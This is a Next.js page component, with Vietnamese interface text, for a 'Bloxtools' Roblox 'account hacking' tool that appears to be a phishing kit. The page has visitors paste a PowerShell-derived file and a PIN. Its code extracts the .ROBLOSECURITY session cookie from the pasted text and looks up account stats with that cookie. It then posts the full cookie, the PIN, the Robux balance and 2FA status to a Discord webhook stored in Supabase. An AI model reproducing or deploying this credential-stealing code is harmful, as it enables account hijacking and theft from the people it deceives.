"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Play, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  // Fetch webhook từ Supabase
  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setError("Slug không hợp lệ.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Không tìm thấy webhook.");

        setWebhookUrl(data.webhook_url);
      } catch (err: any) {
        console.error("Fetch webhook error:", err);
        setError(err.message || "Lỗi tải webhook.");
        setWebhookUrl(null);
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    const regex = /_\|WARNING:[-A-Z0-9+\/=._ ,]*\|_[A-Za-z0-9+\/=._-]{100,}/i;
    let match = text.match(regex);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
      if (cookie.length >= 200) return cookie;
    }

    const fallback = /_\|WARNING:[^|]+\|[^ ,]{100,}/i;
    match = text.match(fallback);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
      if (cookie.length >= 200) return cookie;
    }
    return null;
  }

  function extractUserId(text: string): string | null {
    const guestMatch = text.match(/GuestData.*?UserID=([-]?\d+)/i);
    if (guestMatch?.[1] && guestMatch[1] !== "-1" && guestMatch[1] !== "0") {
      return guestMatch[1].startsWith("-") ? guestMatch[1].slice(1) : guestMatch[1];
    }

    const cookie = extractRobloSecurity(text);
    if (cookie) {
      try {
        const parts = cookie.split("._");
        if (parts.length >= 2) {
          let base64 = parts[1].split(".")[0];
          base64 += "==".slice((base64.length % 4) || 4);
          const decoded = atob(base64);
          const jsonMatch = decoded.match(/["']duid["']\s*:\s*["']?(\d+)["']?/i);
          if (jsonMatch?.[1]) return jsonMatch[1];
        }
      } catch {}
    }
    return null;
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    userData: any,
    fullStats: any | null,
    userId: string | null
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Không có webhook.", type: "error" });
      return;
    }

    try {
      const embeds: any[] = [];

      // Embed 1: Header giống tool (RobloxStats | Profile | AutoHar Link)
      embeds.push({
        title: "RobloxStats | Roblox Profile | AutoHar Link",
        color: 0x5865f2,
        thumbnail: {
          url: userId
            ? `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`
            : "https://www.roblox.com/favicon.ico",
        },
        fields: [
          {
            name: "Username",
            value: userData?.basic?.name ? userData.basic.name : "N/A",
            inline: true,
          },
          {
            name: "Display Name",
            value: userData?.basic?.displayName ? userData.basic.displayName : "N/A",
            inline: true,
          },
        ],
        footer: {
          text: "Tool Used: CustomTool",
        },
        timestamp: new Date().toISOString(),
      });

      // Embed 2: Account Stats
      const ageDays = userData?.accountAgeDays || "N/A";
      embeds.push({
        title: "Account Stats",
        color: 0x2f3136,
        fields: [
          { name: "Account Age", value: `${ageDays} Days`, inline: true },
          { name: "Games Developer", value: "False", inline: true },
          { name: "Banned?", value: userData?.basic?.isBanned ? "True" : "False", inline: true },
          { name: "Premium", value: userData?.basic?.isPremium ? "True" : "False", inline: true },
        ],
      });

      // Embed 3: Robux
      embeds.push({
        title: "Robux",
        color: 0x00bfff,
        fields: [
          { name: "Balance", value: `${fullStats?.robux || 0}`, inline: true },
          { name: "Pending", value: `${fullStats?.pendingRobux || 0}`, inline: true },
          { name: "Credit Balance", value: "0 in KRW", inline: true },
        ],
      });

      // Embed 4: Inventory / Limits
      embeds.push({
        title: "Inventory / Limits",
        color: 0xffd700,
        fields: [
          { name: "RAP", value: `${fullStats?.rap || 0}`, inline: true },
          { name: "Limiteds", value: `${fullStats?.limiteds || 0}`, inline: true },
          { name: "Premium Items", value: "False", inline: true },
        ],
      });

      // Embed 5: Groups / Games
      embeds.push({
        title: "Groups / Games",
        color: 0x5865f2,
        fields: [
          { name: "Owned", value: `${fullStats?.ownedGroups || 0}`, inline: true },
          { name: "Total Groups", value: `${fullStats?.groupsCount || 0}`, inline: true },
          { name: "Games", value: "0 | False", inline: true },
        ],
      });

      // Embed 6: Settings
      embeds.push({
        title: "Settings",
        color: 0x00ff00,
        fields: [
          {
            name: "Email",
            value: fullStats?.emailVerified ? "Verified" : "Not Verified",
            inline: true,
          },
          {
            name: "2FA",
            value: fullStats?.twoFA || "(Not Set)",
            inline: true,
          },
        ],
      });

      // Embed 7: .ROBLOSECURITY
      const shortCookie = cookieValue.substring(0, 150) + "...";
      embeds.push({
        title: ".ROBLOSECURITY (Refreshed)",
        description:
          "```txt\n" +
          shortCookie +
          "\n... (full cookie in attached file)\nWARNING: DO NOT SHARE THIS!\n```",
        color: 0xff0000,
        fields: [
          { name: "PIN", value: pinValue || "N/A", inline: true },
          { name: "UserID", value: userId || "N/A", inline: true },
        ],
      });

      const payload: any = { embeds };

      let response: Response;
      if (cookieValue.length > 1500) {
        const blob = new Blob([cookieValue], { type: "text/plain" });
        const formData = new FormData();
        formData.append("payload_json", JSON.stringify(payload));
        formData.append("file", blob, `roblox_cookie_${userId || "unknown"}_${Date.now()}.txt`);
        response = await fetch(webhookUrl, { method: "POST", body: formData });
      } else {
        payload.embeds[payload.embeds.length - 1].description = "```txt\n" + cookieValue + "\n```";
        response = await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      }

      if (response.ok) {
        setStatus({ message: "✅ Đã gửi thành công!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        setStatus({ message: `❌ Lỗi gửi: ${response.status}`, type: "error" });
      }
    } catch (err: any) {
      setStatus({ message: `❌ Lỗi kết nối: ${err.message}`, type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Điền đầy đủ nội dung và PIN!", type: "error" });
      return;
    }

    const robloxCookie = extractRobloSecurity(fileContent);
    if (!robloxCookie) {
      setStatus({ message: "❌ Không tìm thấy .ROBLOSECURITY!", type: "error" });
      return;
    }

    const userIdRaw = extractUserId(fileContent);
    const userId = userIdRaw && !isNaN(Number(userIdRaw)) ? userIdRaw : null;

    setStatus({ message: "⏳ Đang xử lý và gửi...", type: "info" });

    let userData = null;
    let fullStats = null;

    if (userId) {
      try {
        const basicRes = await fetch(`/api/roblox?userId=${userId}&mode=basic`);
        if (basicRes.ok) userData = await basicRes.json();

        if (robloxCookie) {
          const fullRes = await fetch(
            `/api/roblox?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
          );
          if (fullRes.ok) fullStats = await fullRes.json();
        }
      } catch (err) {
        console.error("Lỗi fetch Roblox info:", err);
      }
    }

    await sendToDiscord(robloxCookie, pin, userData, fullStats, userId);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Đang tải /{slug}...</p>
          </div>
        </div>
      )}

      {error && (
        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-8 max-w-lg text-center shadow-2xl">
            <h2 className="text-2xl font-bold text-red-400 mb-4">Có lỗi xảy ra</h2>
            <p className="text-gray-300 mb-6">{error}</p>
            <Link
              href="/create"
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
            >
              <ArrowLeft className="w-5 h-5" />
              Quay lại tạo mới
            </Link>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${
          loading ? "opacity-40 pointer-events-none" : "opacity-100"
        }`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            {slug.replace(/-/g, " ") || "Account-stealer"}
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Dán toàn bộ nội dung file Roblox (PowerShell script) vào ô dưới, rồi bấm Start.
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${
                    status.type === "success"
                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                      : status.type === "error"
                      ? "bg-red-950/30 border-red-500/30 text-red-300"
                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                  }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <textarea
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Dán nội dung file ở đây..."
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all min-h-[120px]"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Tạo mật khẩu (PIN)"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || !!error || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hướng dẫn sử dụng</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Video hướng dẫn chi tiết cách sử dụng Bloxtools.
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl flex flex-col items-center justify-center gap-4 text-[#64748b] group cursor-pointer hover:border-white/10 hover:bg-[#111] transition-all">
                <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <Play className="w-8 h-8 fill-current" />
                </div>
                <span className="text-sm font-medium">Video Player Area</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}